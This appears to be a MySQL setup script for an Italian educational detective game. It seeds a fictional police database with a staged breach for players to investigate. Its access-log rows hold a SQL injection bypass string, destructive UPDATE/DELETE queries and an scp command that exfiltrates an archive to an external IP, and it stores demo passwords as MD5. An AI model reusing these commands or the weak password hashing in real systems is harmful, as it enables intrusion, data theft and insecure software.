-- ============================================================
--  POLIZIA DI STATO — Database Centrale (polizia_db)
--  PROGETTO: Detective Informatico
-- ============================================================

CREATE DATABASE IF NOT EXISTS polizia_db
    CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE polizia_db;

-- -----------------------------------------------------------
-- UTENTI (login sicuro con prepared statements)
-- -----------------------------------------------------------
CREATE TABLE utenti (
    id            INT AUTO_INCREMENT PRIMARY KEY,
    username      VARCHAR(50)  NOT NULL UNIQUE,
    password      VARCHAR(255) NOT NULL,          -- MD5 (solo per demo)
    ruolo         ENUM('detective','agente','admin') DEFAULT 'agente',
    nome_completo VARCHAR(100),
    created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- -----------------------------------------------------------
-- ANAGRAFICA POLIZIOTTI
-- -----------------------------------------------------------
CREATE TABLE poliziotti (
    id              INT AUTO_INCREMENT PRIMARY KEY,
    matricola       VARCHAR(20) UNIQUE,
    nome            VARCHAR(50),
    cognome         VARCHAR(50),
    grado           VARCHAR(50),
    reparto         VARCHAR(100),
    data_assunzione DATE,
    stato           ENUM('attivo','sospeso','corrotto') DEFAULT 'attivo',
    note            TEXT
);

-- -----------------------------------------------------------
-- MANDATI
-- -----------------------------------------------------------
CREATE TABLE mandati (
    id              INT AUTO_INCREMENT PRIMARY KEY,
    numero_mandato  VARCHAR(30) UNIQUE,
    tipo            VARCHAR(50),
    obiettivo       VARCHAR(200),
    emesso_da       INT,
    data_emissione  DATE,
    stato           ENUM('attivo','concluso','archiviato') DEFAULT 'attivo',
    classificazione ENUM('pubblico','riservato','top_secret') DEFAULT 'pubblico'
);

-- -----------------------------------------------------------
-- REPORT INCIDENTI
-- -----------------------------------------------------------
CREATE TABLE report_incidenti (
    id               INT AUTO_INCREMENT PRIMARY KEY,
    codice_report    VARCHAR(30) UNIQUE,
    tipo_incidente   VARCHAR(100),
    descrizione      TEXT,
    data_incidente   DATETIME,
    gravita          ENUM('bassa','media','alta','critica') DEFAULT 'media',
    agente_incaricato INT,
    stato            ENUM('aperto','in_corso','chiuso') DEFAULT 'aperto'
);

-- -----------------------------------------------------------
-- LOG ACCESSI SISTEMA — qui stanno le prove!
-- -----------------------------------------------------------
CREATE TABLE log_accessi (
    id                 INT AUTO_INCREMENT PRIMARY KEY,
    timestamp_accesso  DATETIME,
    ip_sorgente        VARCHAR(45),
    username_tentativo VARCHAR(100),
    tipo_evento        VARCHAR(50),
    comando_eseguito   TEXT,
    esito              ENUM('successo','fallito','sospetto') DEFAULT 'successo',
    dettagli           TEXT
);

-- -----------------------------------------------------------
-- PARAMETRI DI SISTEMA — l'URL nascosto degli hacker
-- -----------------------------------------------------------
CREATE TABLE parametri_sistema (
    id           INT AUTO_INCREMENT PRIMARY KEY,
    chiave       VARCHAR(100) UNIQUE,
    valore       TEXT,
    categoria    VARCHAR(50),
    data_modifica TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);


-- ===========================================================
--  POPOLAMENTO DATI
-- ===========================================================

-- Utenti  (password: detective123 → MD5)
INSERT INTO utenti VALUES
(1, 'det.rossi', MD5('detective123'), 'detective', 'Marco Rossi',           NOW()),
(2, 'admin',     MD5('admin456'),     'admin',     'Amministratore Sistema', NOW());

-- Poliziotti (record 3 e 5 corrotti dagli hacker)
INSERT INTO poliziotti VALUES
(1,'MAT-001','Luigi',             'Bianchi',           'Ispettore',   'Crimini Informatici', '2015-03-10','attivo',   NULL),
(2,'MAT-002','Anna',              'Ferrari',           'Agente',      'Crimini Informatici', '2018-07-22','attivo',   NULL),
(3,'MAT-003','[DATI CORROTTI]',   '[DATI CORROTTI]',   'Sconosciuto', 'REPARTO NON IDENTIFICATO', NULL,'corrotto','ATTENZIONE: Record modificato da accesso non autorizzato — 2024-11-15 03:42:17'),
(4,'MAT-004','Paolo',             'Ricci',             'Commissario', 'Direzione Centrale',  '2010-01-15','attivo',   NULL),
(5,'MAT-005', NULL,               NULL,                 NULL,          NULL,                  NULL,        'corrotto','RECORD ELIMINATO — vedere log_accessi ID #9'),
(6,'MAT-006','Sara',              'Conti',             'Agente',      'Cyber Forensics',     '2020-09-01','attivo',   NULL),
(7,'MAT-007','???',               '???',               '???',         '???',                  NULL,        'sospeso','Badge revocato. Accesso ai sistemi terminato il 2024-11-14.');

-- Mandati
INSERT INTO mandati VALUES
(1,'MND-2024-001','Perquisizione','Uffici TechCorp srl',                  1,'2024-10-01','concluso','pubblico'),
(2,'MND-2024-002','Arresto',      'Mario Verdi (sospetto frode)',          2,'2024-10-15','attivo',  'riservato'),
(3,'MND-2024-003','Intercettazione','[CLASSIFICATO]',                    NULL,'2024-11-01','attivo', 'top_secret'),
(4,'MND-2024-004','Sorveglianza', '[DATI MANCANTI — record compromesso]',NULL,NULL,       'archiviato','riservato');

-- Report incidenti
INSERT INTO report_incidenti VALUES
(1,'RPT-001','Accesso Non Autorizzato',
 'Tentativo di accesso al DB centrale fallito. 3 tentativi da IP esterno.',
 '2024-11-14 22:30:00','media',1,'chiuso'),
(2,'RPT-002','VIOLAZIONE CRITICA — BREACH CONFERMATO',
 'ACCESSO NON AUTORIZZATO RILEVATO. Intrusi hanno modificato records nella tabella poliziotti e cancellato dati operativi. Per i dettagli tecnici consultare la tabella log_accessi nel terminale MySQL. IP sospetto: 185.234.219.112',
 '2024-11-15 03:42:17','critica',NULL,'aperto'),
(3,'RPT-003','Esfiltrazione Dati',
 'Rilevato trasferimento anomalo verso server esterno. Comando usato dagli intrusi registrato in log_accessi. Indagine in corso.',
 '2024-11-15 04:15:33','critica',NULL,'in_corso');

-- Log accessi (la prova del reato — qui il giocatore trova tutto)
INSERT INTO log_accessi VALUES
( 1,'2024-11-14 22:28:00','192.168.1.5',     'det.rossi','LOGIN',     NULL,                                    'successo','Accesso regolare agente'),
( 2,'2024-11-14 22:29:00','192.168.1.5',     'det.rossi','QUERY',     'SELECT * FROM mandati',                  'successo',NULL),
( 3,'2024-11-14 23:55:00','185.234.219.112', 'admin',    'LOGIN_FAIL',NULL,                                    'fallito', 'Password errata — tentativo 1'),
( 4,'2024-11-14 23:56:12','185.234.219.112', 'admin',    'LOGIN_FAIL',NULL,                                    'fallito', 'Password errata — tentativo 2'),
( 5,'2024-11-15 00:01:04','185.234.219.112', 'admin',    'SQLI_TRY',  'username: admin\'--',                   'sospetto','Tentativo SQL Injection rilevato'),
( 6,'2024-11-15 00:01:07','185.234.219.112', 'SYSTEM',   'LOGIN',     NULL,                                    'successo','ACCESSO OTTENUTO VIA SQL INJECTION — bypass autenticazione'),
( 7,'2024-11-15 00:03:17','185.234.219.112', 'SYSTEM',   'QUERY',     'SELECT * FROM poliziotti',               'successo','Dump completo anagrafica agenti'),
( 8,'2024-11-15 00:05:42','185.234.219.112', 'SYSTEM',   'QUERY',     'UPDATE poliziotti SET nome=\'[DATI CORROTTI]\', cognome=\'[DATI CORROTTI]\' WHERE id=3','successo','Corruzione dati avvenuta'),
( 9,'2024-11-15 00:08:19','185.234.219.112', 'SYSTEM',   'QUERY',     'DELETE FROM poliziotti WHERE id=5',      'successo','Eliminazione record agente'),
(10,'2024-11-15 00:10:00','185.234.219.112', 'SYSTEM',   'QUERY',     'INSERT INTO parametri_sistema VALUES (NULL,\'last_exfil_destination\',\'http://localhost/progetto-detective/hacker/login.php\',\'BREACH_TRACE\',NOW())','successo','Traccia lasciata involontariamente durante esfiltrazione'),
(11,'2024-11-15 00:15:22','185.234.219.112', 'SYSTEM',   'EXFILTRATION','scp dati.tar.gz root@185.234.219.112:/var/www/upload/','successo','Esfiltrazione completata — 2.3 GB trasferiti');

-- Parametri sistema
INSERT INTO parametri_sistema VALUES
(1,'versione_sistema',        '4.2.1',                                                            'sistema',   NOW()),
(2,'ultimo_backup',           '2024-11-14 00:00:00',                                              'sistema',   NOW()),
(3,'last_exfil_destination',  'http://localhost/progetto-detective/hacker/login.php',              'BREACH_TRACE','2024-11-15 00:10:00'),
(4,'email_admin',             'admin@polizia.gov.it',                                              'contatti',  NOW());
